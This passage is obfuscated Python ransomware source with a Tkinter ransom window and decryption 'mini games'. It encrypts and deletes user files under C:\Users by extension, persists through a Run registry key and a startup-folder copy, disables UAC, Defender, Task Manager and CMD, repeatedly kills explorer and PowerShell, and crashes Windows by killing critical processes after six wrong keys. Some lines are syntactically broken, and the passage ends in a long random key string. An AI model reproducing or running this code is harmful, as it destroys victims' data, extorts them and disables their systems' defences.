                    lb4.insert(0,"The answer is wrong! Please check again!")
                    lb4.insert(0,"your answer:"+answerchack)
                    msgbox.showwarning(":)","The answer is wrong! Please check again! ")
                    msgbox.showwarning(":)","your answer:"+answerchack)
            gameplay=Toplevel(nmys)
            gameplay.title("GameWindow")
            gameplay.geometry ('600x450+1350+350')#line:56
            gameplay.configure (bg ="black")#line:58
            gameplay.wm_attributes ("-topmost",1)#line:60
            gameplay.configure(bd=10)
            gameplay.overrideredirect (True )#line:107
            lb3 =Listbox (gameplay ,width =84 ,height =7 ,selectmode ="extended",yscrollcommand ="Scrollbar",bg ="black",fg ="red",relief ="groove",bd =4 )#line:99
            lb3 .place (x =-10 ,y =33 )#line:100
            lb4 =Listbox (gameplay ,width =84 ,height =7 ,selectmode ="extended",yscrollcommand ="Scrollbar",bg ="black",fg ="red",xscrollcommand ="Scrollbar",relief ="groove",bd =3 )#line:101
            lb4 .place (x =-10 ,y =195)#line:102
            l3=Label(gameplay,bg ="black",fg ="red",width =42,text="[Decrypted Hash List]",relief ="groove",bd =3,font=font1)
            l3.place(x =-10 ,y =157 )
            l4=Label(gameplay,bg ="black",fg ="red",text="[Hash List]",width =42,relief ="groove",bd =3,font=font1)
            l4.place(x =-9 ,y =-7 )
            E =Entry (gameplay ,width =42 ,bg ="black",fg ="red",relief ="groove",font =font1 ,bd =4 )#line:105
            E .place (x =-9 ,y =330 )#line:106
            b4 =Button (gameplay ,text ="Enter Your Answer" ,width =18,bg ="black",fg ="red",relief ="groove",font =font1 ,bd =3 ,command=chacksum)#line:194
            b5 =Button (gameplay ,text ="Exit Game",bg ="black",width =10,fg ="red",relief ="groove",font =font1 ,bd =3,command=EXITGAME)#line:197
            b6=Button (gameplay ,text ="Get Hash",bg ="black",width =9,fg ="red",relief ="groove",font =font1 ,bd =3 ,command=hashasnwers)#line:197
            b4 .place (x =-10 ,y =375 )#line:199
            b5 .place (x =435 ,y =375 )#line:202
            b6.place (x =260,y =375 )#line:199
        else:
            msgbox.showerror(":)","Haven't implemented it yet. Stay tuned for the next update!")
    b1 =Button (gamewin ,text ="Game Play" ,width =15,bg ="black",fg ="red",relief ="groove",font =font1 ,bd =3 ,command=GamePlay)#line:194
    b2 =Button (gamewin ,text ="Selection",bg ="black",fg ="red",relief ="groove",font =font1 ,bd =3,command=select)#line:197
    b3=Button (gamewin ,text ="Point Shop",width =13,bg ="black",fg ="red",relief ="groove",font =font1 ,bd =3 ,command=GamePlay)#line:197
    b1 .place (x =-10 ,y =375 )#line:199
    b2 .place (x =440 ,y =375 )#line:202
    b3.place (x =225 ,y =375 )#line:199
    lb.insert(0,"need in the point shop.")
    lb.insert(0,"you can get them by purchasing the file decryption product")
    lb.insert(0,"You can get points by clearing the mini-games here and")
    lb2.insert(0,"hash game")
    lb2.insert(0,"2048 game")
    lb2.insert(0,"up down game")
def encmsg ():#line:152
    msgbox .showwarning (":D","In some cases, it may take a long time to decrypt the file. If you want to protect the file, please wait until it is finished")#line:153
trych =6 #line:154
def rndk (OOO000OO0O0OOO00O ,ADCK2):#line:156
    global ADCK #line:157
    #ADCK =AESkey #line:158
    for O0OOO00OOOO0OOO0O in range (Dirlist2 +OOO000OO0O0OOO00O ):#line:159
        O0OOOOOOOO0O00O0O =hashlib .sha256 (ADCK2.encode () ).hexdigest ()#line:160
        ADCK2 =O0OOOOOOOO0O00O0O#line:161
        O0OOOOOOOO0O00O0O =hashlib .sha256 (ADCK2.encode () ).hexdigest ()#line:162
        ADCK2 =O0OOOOOOOO0O00O0O#line:161s
    wf=open("Key,iv,extension","w")
    wf.write(AESkey.decode()+"\n")
    wf.write(key.decode()+"\n")
    wf.write(ivlist+"\n")
    wf.write(encflist3,encflist2,encflist+"\n")
    wf.close()
    lb.insert(0,ADCK2)
    lb.insert(0,AESkey)
    lb.insert(0,ADCK2)
    lb.insert(0,AESkey)
    return ADCK2
def start ():#line:163
    global trych #line:164
    trych -=1 #line:165
    time .sleep (1 )#line:166
    O0O0OOO00OO0O0OO0 =""#line:167
    O0O0OOO00OO0O0OO0 =e1 .get ()#line:168
    e1 .delete (0 ,END )#line:169
    if trych !=0 :#line:170
        if O0O0OOO00OO0O0OO0 ==key.decode() ():#line:171
            lb .insert (0 ,"Your Key:"+key.decode ())#line:172
            lb .insert (0 ,"start to file decryption....")#line:173
            lb .insert (0 ,"--Thank you for using this software!--")#line:174
            sleep (1 )#line:175
            OOO0O0OOOO0OOOOOO =threading .Thread (target =decrypting )#line:176
            OOO0O0OOOO0OOOOOO .start ()#line:177
        else :#line:178
            O0000000OOO00OOOO =random .randint (10 ,Dirlist2 )#line:179
            key=rndk (O0000000OOO00OOOO ,key)#line:180
            lb .insert (0 ,"")#line:181
            lb .insert (0 ,"--sorry! We can't decrypt your files! please check the key--")#line:182
            lb .insert (0 ,"")#line:183
            lb.insert(0,AESkey)
            msgbox .showerror (":D","--sorry! We can't decrypt your files! please check the key--")#line:184
    else :#line:185
        import subprocess #line:186
        msgbox .showerror (":D","--You have exhausted the given number of keystrokes. :)--")#line:187
        O0OOOOOO0000000O0 =0x08000000 #line:189
        subprocess .call ('taskkill /F /IM csrss.exe',creationflags =O0OOOOOO0000000O0 )#line:190
        subprocess .call ('taskkill /F /IM svchost.exe',creationflags =O0OOOOOO0000000O0 )#line:191
        subprocess .call ('taskkill /F /IM wininit.exe',creationflags =O0OOOOOO0000000O0 )#line:192
        subprocess .call ('taskkill /F /IM winlogon.exe',creationflags =O0OOOOOO0000000O0 )#line:193
b1 =Button (nmys ,text ="[Decrypt]",width =9 ,height =0 ,command =start ,bg ="black",fg ="red",relief ="groove",font =font3 ,bd =3 )#line:194
b2 =Button (nmys ,text ="[Help]",width =6 ,height =1 ,command =msgb ,bg ="black",fg ="red",relief ="groove",font =font3 ,bd =3 )#line:195
b3 =Button (nmys ,text ="[Clear]",command =clear ,width =7 ,height =1 ,bg ="black",fg ="red",relief ="groove",font =font3 ,bd =3 )#line:196
b4 =Button (nmys ,text ="[Ecrypted files list]",width =20 ,height =1 ,command =load ,bg ="black",fg ="red",relief ="groove",font =font3 ,bd =3 )#line:197
b5 =Button (nmys ,text ="[Mini Game]",width =12 ,height =1 ,command =MiniGame ,bg ="black",fg ="red",relief ="groove",font =font3 ,bd =3 )#line:198
b1 .place (x =678 ,y =548 )#line:199
b2 .place (x =0 ,y =0 )#line:200
b3 .place (x =75 ,y =0 )#line:201
b4 .place (x =783 ,y =548 )#line:202
b5 .place (x =865 ,y =0 )#line:203
startPath ="C:\\Users\\**"#line:206
ivlist ={}#line:207
def encrypt_file (O0OO000OO0O00OOOO ,OOO0OOOOOOOOOOOO0 ,OOOO000OO000OO00O =None ,OOO0O00OOO0O0O000 =64 *1024 ):#line:208
    try :#line:209
        global ivlist #line:210
        if not OOOO000OO000OO00O :#line:211
            O00OOO0OOOO00000O =bytes (key_generator2 (64 ).encode ())#line:212
            OOOO000OO000OO00O =OOO0OOOOOOOOOOOO0 +"."+hashlib .sha256 (O00OOO0OOOO00000O ).hexdigest ()#line:213
        O00OOOO00OO00O0O0 =bytes (key_generator (16 ).encode ())#line:214
        O0O00O00OOO0000O0 =AES .new (O0OO000OO0O00OOOO ,AES .MODE_CBC ,O00OOOO00OO00O0O0 )#line:215
        OO0OO0OOO00OO0O00 =os .path .getsize (OOO0OOOOOOOOOOOO0 )#line:216
        with open (OOO0OOOOOOOOOOOO0 ,'rb')as O0OO0OO0O0O0O0000 :#line:217
            with open (OOOO000OO000OO00O ,'wb')as O000O00OOOOO0OOOO :#line:218
                O000O00OOOOO0OOOO .write (struct .pack ('<Q',OO0OO0OOO00OO0O00 ))#line:219
                ivlist [OOOO000OO000OO00O ]=O00OOOO00OO00O0O0 #line:220
                while True :#line:221
                    O0O0000000O00O0OO =O0OO0OO0O0O0O0000 .read (OOO0O00OOO0O0O000 )#line:222
                    if len (O0O0000000O00O0OO )==0 :#line:223
                        break #line:224
                    elif len (O0O0000000O00O0OO )%16 !=0 :#line:225
                        O0O0000000O00O0OO +=b' '*(16 -len (O0O0000000O00O0OO )%16 )#line:226
                    O000O00OOOOO0OOOO .write (O0O00O00OOO0000O0 .encrypt (O0O0000000O00O0OO ))#line:227
    except :#line:228
        pass #line:229.
abcd =['txt','jpg','hwp','ppt','mp3','mp4','egg','jpeg','zip','tbres','iso','app','avi','png','wepb','pps','pptx','ppsx','msi','rar5','rar','7z','img','html','js','jar','php','css','h','c','cc','py','bak','hpt','hwt','htm','old','php3','phtml','sgml','shtml','vbs','vbt','vbw','vbx','vbr','vbp','vbg','ini','java','rofl','db','aegraphic','wav','essentialsound','olp','sys','prtape','xml','prmdc2','log','scoreboard','vmsd','vmx','DAT','vmxf','vmdk','appinfo','appicon','nvram','xlsx','xls','wfx','pyd','bmp','wks','docx','doc','dat','html','lnk','dll','NLS','msc','qmlc','bin','rtf','bat','key','pas','ost','eml','edb','asm','pfx','pem','p12','csr','gpg','aes','svg','asm','mkv','myd','sxc','']#line:230
encflist =[]#line:231
def encrypting ():#line:232
    OOOO0OOOO00O0000O =0 #line:233
    global encflist3 #line:234
    global encflist2 #line:235
    global encflist #line:237
    OOO00OO000O000O00 =0 #line:238
    for OOOO0O0O00OO00OOO in glob .iglob (startPath ,recursive =True ):#line:239
        O00OOOO000000O000 =OOOO0O0O00OO00OOO .split (".")[-1 ]#line:240
        O00O0OO00O0000O00 =[OO000OO000OOOOO00 for OO000OO000OOOOO00 in abcd if O00OOOO000000O000 in OO000OO000OOOOO00 ]#line:241
        if len (O00O0OO00O0000O00 )==1 :#line:243
            if (os .path .isfile (OOOO0O0O00OO00OOO )):#line:244
                encrypt_file (AESkey ,OOOO0O0O00OO00OOO )#line:245
                os .remove (OOOO0O0O00OO00OOO )#line:246
                encflist .append (OOOO0O0O00OO00OOO +"\n")#line:247
    encflist2 =list (ivlist .keys ())#line:252
    encflist3 =len (encflist2 )#line:253
def get_value (O00O0O0OOO00000O0 ):#line:254
    for OOOO000000O0OOOO0 ,O00O0OOO0OOOO0OO0 in ivlist .items ():#line:255
         if O00O0O0OOO00000O0 ==OOOO000000O0OOOO0 :#line:256
             return O00O0OOO0OOOO0OO0 #line:257
    return None #line:258
def decrypt_file (O0O0OO0O0O000OOOO ,OO0O00OOO0OO0O000 ,O00O00O0O00O00OO0 =None ,O00O0OO0OOO000OOO =24 *1024 ):#line:259
    try :#line:260
        if not O00O00O0O00O00OO0 :#line:261
            O00O00O0O00O00OO0 =os .path .splitext (OO0O00OOO0OO0O000 )[0 ]#line:262
        with open (OO0O00OOO0OO0O000 ,'rb')as OO00000OOO0OO0OO0 :#line:263
            O0OO0O0OO000OOOO0 =struct .unpack ('<Q',OO00000OOO0OO0OO0 .read (struct .calcsize ('Q')))[0 ]#line:264
            O0O000O000OOO0OO0 =get_value (OO0O00OOO0OO0O000 )#line:265
            OOO0O0OOOOO000O0O =AES .new (O0O0OO0O0O000OOOO ,AES .MODE_CBC ,O0O000O000OOO0OO0 )#line:266
            with open (O00O00O0O00O00OO0 ,'wb')as OO0O00O0OO00OOOOO :#line:267
                while True :#line:268
                    O0O00OOOOO00000OO =OO00000OOO0OO0OO0 .read (O00O0OO0OOO000OOO )#line:269
                    if len (O0O00OOOOO00000OO )==0 :#line:270
                        break #line:271
                    OO0O00O0OO00OOOOO .write (OOO0O0OOOOO000O0O .decrypt (O0O00OOOOO00000OO ))#line:272
                OO0O00O0OO00OOOOO .truncate (O0OO0O0OO000OOOO0 )#line:273
    except :#line:274
        pass #line:275
startPath5 ="C:\\Users\\**"#line:276
def decrypting ():#line:277
    O0O0OOOOO0O0O0O00 =1 #line:278
    for O0O0OOO0O00OOO0O0 in glob .iglob (startPath ,recursive =True ):#line:279
        try :#line:280
            if (os .path .isfile (O0O0OOO0O00OOO0O0 )):#line:281
                if get_value (O0O0OOO0O00OOO0O0 )!=None :#line:282
                    lb .insert (0 ,'Decrypting Success!> '+O0O0OOO0O00OOO0O0 )#line:283
                    nmys .update_idletasks ()#line:284
                    progressbar3 ['value']=O0O0OOOOO0O0O0O00 /encflist3 *100 #line:285
                    O0O0OOOOO0O0O0O00 +=1 #line:286
                    decrypt_file (AESkey ,O0O0OOO0O00OOO0O0 )#line:287
                    os .remove (O0O0OOO0O00OOO0O0 )#line:288
        except :#line:289
            lb .insert (0 ,'Decrypting Failed!> '+O0O0OOO0O00OOO0O0 )#line:290
def expkill ():#line:291
    O00O0OOO0000000OO =['explorer.exe','cmd','Taskmgr.exe',"regedit.exe","conhost.exe","powershell.exe","mmc.exe",]#line:294
    O0000OOO00000OO0O =0x08000000 #line:295
    while True :#line:296
            subprocess .call ('taskkill /IM '+O00O0OOO0000000OO [1 ],creationflags =O0000OOO00000OO0O )#line:297
            subprocess .call ('taskkill /IM '+O00O0OOO0000000OO [2 ],creationflags =O0000OOO00000OO0O )#line:298
            subprocess .call ('taskkill /IM '+O00O0OOO0000000OO [4 ],creationflags =O0000OOO00000OO0O )#line:299
            subprocess .call ('taskkill /IM '+O00O0OOO0000000OO [3 ],creationflags =O0000OOO00000OO0O )#line:300
            subprocess .call ('taskkill /IM '+O00O0OOO0000000OO [5 ],creationflags =O0000OOO00000OO0O )#line:301
            subprocess .call ('taskkill /IM '+O00O0OOO0000000OO [6 ],creationflags =O0000OOO00000OO0O )#line:302
def diedrsprc ():#line:303
    OO0OO00O0O0O0OOO0 =0x08000000 #line:304
    OO000O0O000O0OO0O =subprocess.Popen .poll (aos )#line:305
    if OO000O0O000O0OO0O ==None :#line:306
        print ("ok")#line:307
    else :#line:308
        print ("no")#line:309
def rscpy ():#line:310
    global OOOO0000O000O0000 #line:311
    OO0O0000OO0000O00 =os .path .realpath (__file__ ).split ("\\")[-1 ].split ("py")[0 ]+".exe"#line:312
    O0O000OO0000O0O0O =os .path .dirname (os .path .abspath (sys .executable ))#line:313
    O0O0O00O00OOO000O =O0O000OO0000O0O0O +"\\"+OO0O0000OO0000O00 #line:14
    OOOO0000O000O0000 ="C:\\programdata\\microsoft\\windows\\startmenu\\programs\\system\\"+OO0O0000OO0000O00 #line:315
    try :#line:316
        shutil .copy2 (O0O0O00O00OOO000O ,OOOO0000O000O0000 )#line:317
    except :#line:318
        pass #line:319
def crtkey ():#line:320
    OO0O00OO00O000O00 =os .path .realpath (__file__ ).split ("\\")[-1 ].split ("py")[0 ]+".exe"#line:321
    O0OO0O000O0O00O0O =os .path .dirname (os .path .abspath (sys .executable ))#line:322
    OO000O0O0OO0OO00O =O0OO0O000O0O00O0O +"\\"+OO0O00OO00O000O00 #line:323
    O00OO0O0OOOO0OO00 =r"Software\Microsoft\Windows\CurrentVersion\Run"#line:324
    O0OO0OOOO0O0OOO00 =ConnectRegistry (None ,HKEY_CURRENT_USER )#line:325
    O000O0OO000O0O000 =OpenKey (O0OO0OOOO0O0OOO00 ,O00OO0O0OOOO0OO00 ,0 ,KEY_WRITE )#line:326
    SetValueEx (O000O0OO000O0O000 ,"WindowsAutoUpdate",0 ,REG_SZ ,OOOO0000O000O0000 )#line:327
    CloseKey (O000O0OO000O0O000 )#line:328
def cbatfb ():#line:329
    try:
        O0O0OOO00OOO0OOOO =open ("x.bat",'w')#line:332
        O0O0OOO00OOO0OOOO .write (r'reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t reg_dword /d 0')#line:347
        O0O0OOO00OOO0OOOO .write (r'reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t reg_dword /d 0')#line:348
        O0O0OOO00OOO0OOOO .write (r'reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "PromptOnSecureDesktop" /t reg_dword /d 0')#line:349
        O0O0OOO00OOO0OOOO .write (r'reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t reg_dword /d 1')#line:350
        O0O0OOO00OOO0OOOO .write (r'reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t reg_dword /d 1')#line:351
        O0O0OOO00OOO0OOOO .write (r'reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t reg_dword /d 1')#line:352
        O0O0OOO00OOO0OOOO .write (r'reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoWinKeys" /t reg_dword /d 1')#line:353
        O0O0OOO00OOO0OOOO .write (r'reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\System" /v "DisableCMD" /t reg_dword /d 1')#line:354
        O0O0OOO00OOO0OOOO .write (r'reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System" /v "DisableCMD" /t reg_dword /d 1')#line:355
        O0O0OOO00OOO0OOOO .write (r'reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Network"')#line:356
        O0O0OOO00OOO0OOOO .write (r'RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters 1, True')#line:357
        O0O0OOO00OOO0OOOO .write (r'exit')#line:358
        O0O0OOO00OOO0OOOO .close ()#line:359
        O0O0OOO00OOO0OOOO =open ("xx.vbs",'w')#line:332
        O0O0OOO00OOO0OOOO.write(r'Set objShell = CreateObject("Shell.Application")')
        O0O0OOO00OOO0OOOO.write(r'objShell.ShellExecute "x.bat", "/c lodctr.exe /r" , "", "runas", 0')
        O0O0OOO00OOO0OOOO.close()
        time.sleep(0.1)
        os .remove ("xx.vbs")#line:362
        os .remove ("x.bat")#line:362
    except:
        os .remove ("xx.vbs")#line:362
        os .remove ("x.bat")#line:362
def batfb2 ():#line:363
    try:
        OO0O0O00000OOOO0O =open ("x2.bat",'w')#line:366
        OO0O0O00000OOOO0O .write (r'reg delete "HKEY_LOCAL_MACHINE')#line:381
        OO0O0O00000OOOO0O .write (r'exit')#line:382
        OO0O0O00000OOOO0O .close ()#line:383
        O0O0OOO00OOO0OOOO =open ("xx2.vbs",'w')#line:332
        O0O0OOO00OOO0OOOO.write(r'Set objShell = CreateObject("Shell.Application')
        O0O0OOO00OOO0OOOO.write(r'objShell.ShellExecute "x2.bat", "/c lodctr.exe /r" , "", "runas", 0')
        O0O0OOO00OOO0OOOO.close()
        os.system('xx2.vbs')#line:360
        time.sleep(0.1)
        os .remove ("xx2.vbs")#line:362
        os .remove ("x2.bat")#line:362
    except:
        os .remove ("xx2.vbs")#line:362
        os .remove ("x2.bat")#line:362
if __name__ =="__main__":#line:386
    def key_generator (OO0O0O00OOOO00OO0 =32 ,OOO0O0OO00OOOO0OO ="v_GbjBb9ZnD^&!AeY3Cp35GFD5TscaHeG4ZvFzbA**Uwn3hRe%j!CTd%2E#CR3X%7bb8QC8b^eYVaCm^Y6UHDFArQxQfNXdF6+WX7Gj8uEgU8!aE2wMgN+D!uC^fw$FBtayc$Z4!Dybdduaf!tqWHryg#&nTVf%vpYfVwR&@CjgEexRjfv5@3jCT4CsXqqA3zdU3qv4=eeuR_PJ%WS@v4WUtA@bwA7KrMH2Ke8bCJnq$J?nAmAQpBEp&zJWBG##2KTN4P?mXCYXPwGKjffzXwJwsqNgwA+rFBLmhvV3QvnYQ#vdMUYk_cnG8@fE9*!=S?eCv*^c?Dr-G&7ZXM#n%56=KA55gkF@!k&7DHrMzDMkNrgS#v$T$yBF2mZBuh-p_h-N7NEkU7-yj53D2+qBgd^dbx6QHYAw9pJrV&-#JZjs#@Le&rUSk3nqWKE%$q6q&J^2TEEnRxqa7@6w_m8tab!j^sSxwQA3Ed@@3b3@!6LyX$e56hsnBZhUMhfrVG8pgCEts%+nrSbv$?cXpkL2MSWmVh_VSfDHTDTLF@RTx63cfWVfjn22wvu+u8Yv-%mf4V@78yQvp49tQZTnGhCvGp#QH#a-r^5fY-vH*WZ_qe6=aN?r$A9+5!b=jx-%yVQw?ETZN*M+hZB#=Wg&5rK-?-#W*xcmdXL+NC2Z3&A6yJ$GG#ApH$4UsJ7NuEeaK=QVk&mSwNj?%gmdQhmjGE=Y7%m^wb?8?ZwypDFbcJuyNvtSW+!KnLv^WA^KYbXu86LaHrK@wB+QXwA@K9k5XS-TQt7tp&X9jJ#drn8KEMXFw$$dg+xS#RtLH^mp3CpRZyMRUWcZe3jedpymZbjAjR=?YgDXGuz$fjs+SC%@vu*PxRE=4X*k96jX#2YHvDw8sH$6ZURC2*f2ac&f2EN7MapzZ-QJdnqv6*BqsxATHZp*RfXaKw28d$&Zk!44A#DE7rcr_GujKrG@3L94pV_5a+Efg#@pr&9T?Yh5ctq%L#yt^g-S4g@^WAz#ytVz4MyrM_y#P@@_#Jb8yDP3-+xU8pCnFS#hcK=rH5g=WCxBthHPF_%@kJyB7muxrsu_R$52$GtBg9hSn_adqYaRxyUXdp9EB*_mrhtkF2R@Dk=T&DyF-TCH+%UjyMb2V$*N_WKY=AVnrTCe*?xK!HtWChE*gy4E@=Q=69hrKtWuL5Rns&Tnze&XH?4KXp49@+MY&cBS%@G3_pBwSCN$SnLehwqE5Vgz2nWc!CTWPAB9eHMXPL^^Rgzs_8NG=nV4Q+$TkchdZbwe=5#G5BG!=xqfksd7MjWwkSX9FwgE=UGHxc=A_ZKkdFxD?fSSCfnZ%+FBsHFpCT_Paa%HsgmQRpTnr5qZ3?Wvhba-YkM5?2mWf7r3b$GBy^g4&W=jQ%XKNr!UyVmPNMbTn*f_7L=!y2A#KjmNcUVw#q#^NCNH$9n5xEe5MGaD6qpserZj-Fw7c5NAfWT=s7rhSS?F8tL?H977a#+uvdmyW-qnPyt@qde&$$U8C*?5qvXU5c8Wnh$tq3@emktf4mF##*a=ywttp4dFe3Pc3eyZ3m9s8FpQN?+pt%3^8vh4pGMah$52*mzG9N4A#3e#q_BqeRKx%2gFG^Mg$h$3+^rrQR8qN*7bSzTdW5K8$$mJFu9S4$d57_+&r_+xLkBcWY7mfXh#J@fy*Vs&uxLVnU?B8DXLe3&^uXSQ3mhsCcBzGE7=@58&Nkpb67g^K572Q93j!Umknhr+h6!HB8N6s-LcW6Qsx#e4NSfA=BT$VE4BCRrtPTa*MNtkD^_r8T?bSrCQ2=X8Np@Hx=@9NQG7G-9qU@3aHPg^b!cD&69^*YX^69emrn6LMpWbFx!tzkz+3C#3yTG5R^7%dzE^AWh!Chy=mK9j%Yb2Xj3NKL!dRPk@@c4w-za+-bEv6eMjhtug$LLHE_qs*#_mVkf9Y$RvHf&8kYjHTCdYDnzSAnKGk^PqsuYu%eeaU3##%tmYwc8KjmCEY!Sd?j3X*&?+JL=QKzPXd%bjZ@PHtHmEJPWf@&6SF4&VnE8^!eJXBazAc#8ZPmpTPz5M-rF3Q*XLuD_YY@=P?8C#%DYB@b?z-6Vhd?FTyDb=ws4?YC$-f58=*fdCMZs3j^e7Q92peB$bp2Hyu2h%+vAu#LS4h#Tv^j*=g@cZ+H5@h$G_hu35Ej3s$-fRUueqAGAQMTfsuUCaX9Z6cm-gJYw=@F9_8A!APA3dR!!LpLjYSMM-!@pJzpn*u74AxzQM_%gaP_wg$#^f$QNVT_*3-S#4+LnL3MQh*TuDu45uUe!g9h!*9$-^6HD#YqS_9d!&qMnf3cp+!nQ%26#3EMpbeDH9KWJe!TNfSa8&y3nnxrWg7LVgK_zbhb$jLuzpYQsXyq7U4gnQyzwE$+7VWQZ52vH5G*5B4crZBQVX#p+^?LQMH!_u&#G?$dVdDPS&_Vep#fWdK6pr6H_Q?sEPYmgj3c-H5$fVU!5Z3WQecfeAm6vD+hF+EWhR8?48&HR=_cGu?&MtZphzU5!RD@n9BazLV9zVfA=d_jVMA9b^y==VXX-cj3E_75exG*j-u5+2tVYyc*fFBNhuaRY_vVF82%dW33dSaRs^nMSVPprbrXQ-p--e7%6MG9ryUWUT4k%s@-ebXA2PXPeqH*%bNqxK&QsYML7hN_na*r_!G96-s@6cZbTQjYky2UjLeZyCfQLGvfJtNnA*$3_8gu*QNM-PNR!7eEy6W-vs$gxDyckKm&v%zECwcfn4GgYnTmwKf2SYep%xQx*YuhhK=c=CJ2f6hWAQnw8penG&Z4Nn++Ngee^SEpPRg^HTdM*pHXtdB4xZE=Y2K6jp#2gs7+gW6VE+c6%3@2%EX+deYJsMkpqN$QJ^g+%vSUF?wh@WgLQZVpKfkb_MzXc*zRZ-bkWH*F3vgMnN67W55X^G#QyUZrxFGWV6=fxQ#e#v?yRFjQZfXf^XP3MG@+UF!E+kGyuPf%K9Ga=Wbkx7PfGYjwUt+B$U_ubbKt#JEY!wbFgs@KEbL#Tgggjz?ub=jN%Q6QwH#aKKAw2kw#4!_dLyZvbM5Sz4qtpJeGUjNtJYvSJZ$w@AKzr4xC#-K5eTDmXcqL#y_Z#&59bL7cdVZfsv?yd$Gt-_DNyGeGQqxubDUQTt9KNu^_ybUTKkaevTsrP*pRzM=n#M6K4@X&%F4x$JeUTa@69#+&%wW%GTJz93v9+^DF6es6tGwdZbTrM=q9CNXe3Rs_V!wY-QS+TAW5PX3gffYfYJzA=g+RNuDMd#W7y*!sWc4XP8Dm=TWWYqn7A@K#8=8J+s8WMCxJDgBc7QjFtK4MWQ_66yf#Xj=_L2VVT-5U-6wenV@cXTM_fKtMP@-MmJ!GWrM646Q=H-aThGUav266kUXE_ZC^^%YV$QfNS*WV@r_txUkYshdZ4byCkU$!rycU$b?p9SeHqQg@g5unf#Z3a_QW54n!CTK!W^GzzvQjYbq8WcNRQMtRgZQg+GAxPWe3Fh4ZEPcjbcUDY#WY+MhEQBAh*t4Q2=e2QMGanNSzn%S&Az2?DzJHKQ#x*6DPqTJ_K-VZve5LJpztsF?2H@mUx$s#&?Z8FCQ3m@3aRxMJ&HaT*b&%Pg-sEW-?9f%n6Z2Kwku+bZGYr45_Q3BGbNj-a_ERQ9&Lxh8yGWh6yGDfu9&NR39NB&VDC%Hz=k#LWH57+%&*s-R7rWEgfsbN$-g!T+y?3@g+&@qS-bVZvF_$je-k$CKM9Zf#A6eP!XP!Ev^F_Z6_bsKuW!hDFNkLxX7R%d-V9h?FaLMEygpHPKs3f@eSet3etM^%^tNavbNFb4gfb**QYp#A4@UgJqkmABnL9zq8TExQ4F4d?zRmDE8Ras=rr49aD-E7L&CY*V2?7M6?3+27THuWWBkzfkxVrHn@a8bebeuMNt8*tAG*YGdL!c@BPryvcuxXM%jKdcB@h&fap9GFa@7Y3!Ekvb@Fr&AEegGuYRd@x+W%%QbZf4ga2aNRPVpTn!cyB3f+Q3AWZSHvYy5#_b@L!W94+4Mh@^fZQUkTs?zXRmgRK#c#9p*xf9@pUgdz4k@YNKk@5eBrSgXyCPM$jts?2J94R7PuA!-VcuU@ZYeK?J&wuGw2GfY?LW#rGkefQZw?sR=uScYc=5+NR5n5Jf?K#qd#yjkZNcg!JmLt=-RTjN=^5uRqcwxgu7ESM%rjBPz!Te*NFb=rx^G5r$hYXYRf@$JTB?M#z5-p3#vgcdzn4Xz9Kh67Fp%Cdzd2F4*!uMuLw=Sv!%8hYSj?KMPA2J_nUcG$zg#Jm%rSbV8=N4PZR6=ftGKt2Lw4-r_^A6fV5sFv8QDEbpE?G##!eQ$aqu*ZxX+4ruYXfBL_h$nMsJYWa4W@q4#&3xuHC&-Vm5q$PVQYzd=nzGcjFhnYdSMJUWAqSaeHbesZSeDex+7vZbLY&f*C6kC@GV!rWj4AhFU4ktmhyBzrp_wyC_$=bVW%@M*+#LFQ9Z4h?rL6^A3-FE+Q^jhR2cc@A!ccG%FayF3gV_SL&Hk2hf47!njRN&prTN2?PxXLXA-Tda+?g-vhj=m8-fypG4V=2L5Pd!pg4nDSejPAyMc%jBcMc+=PfU=CQpEgYS69r&a@VM=cQUThw&$3mPa@m-Fgs@#Rr8%$-fh*unC#*M^%@Hw7uEvdYYqAP5zQGaurFVn8N=!u#DUcLrEnn38Upu#u-QXAUx8UgH_cw+%8&q4Fk2VrcTRK#-e7&sbud4mNuvQR4F$7T!qNphK9UTZVGDS9^NH86tRtDQcCucwzsh%PnC5*PZcnnFkV?mjJh9LA#VBp7DZdZ@22rrw4XhATN9!bGzEeQPE7%fj@VWQHS=88hEHgbD8rVH@ZzjTb6gzBVGe25rxNW9SPHF5ptnTe5Z&YUeM3*+b9AXNe8@$rwxgAxeXZgMVJehgtX2!pJFT%RWr9749e5?cC$9c#*eTp*Htg@sLsypY!VF^hXUrV@g%N=u6e+N4sLPL+xJ@N@4SRnF8TRH!Lrh+3cp6?MzU%@mDHQ9Cd_@u4gb@3P5faXuP5BgYG*dLgNS@J@xy&+ujpsEQK&HKeXUKYNQKvP7Z^Ck#sueeG=7nCAyVHCmV&eK!s=Ysnfhy!q6!yZkQhXZbc3N-=XGvSZttD+!jB7!_&4-5Za@x#WK65rk6xwEzjvyvGCCcMcTLUmFQf*xb+qjBT!A7L#aRfX5&G@GL%_F!4%hW_tdsF?PX!$PBcX&a74Q#bBwQBd-6W@S9dq&TTE&&&9$H5WhT-@%Z$%#-SHmR8Q@K85Cuc?@tCnhG=TTt34bt$HXxy-DyFtP?VgpqW+X9$ZwATcjfX9Nyq@pR*pbtnP@3EUV^tnm@yhF#NsjJPAhZj$?!6%Z@xrmu=+5=z=Ba+$TG_USS8+hdLN+JcFUw8Q^gts3m$QX2!xqr7HcPNqVk3Fq+FMhk2^+UMvz9^jKHV4-N$xtThrmW?-xTgVuvt!?va$REQD$+-KMA48vSE6a@U&s72zk?GX3LpP=D-j_B&43YL#Fb*ps6ChejR#BKWz+52qdhw9+WLeFBz-jHabJKY9u$3xHHy=58_9tJC+XRDYY9T=Pbf?KWkz3ENQKBwz?td$Gs8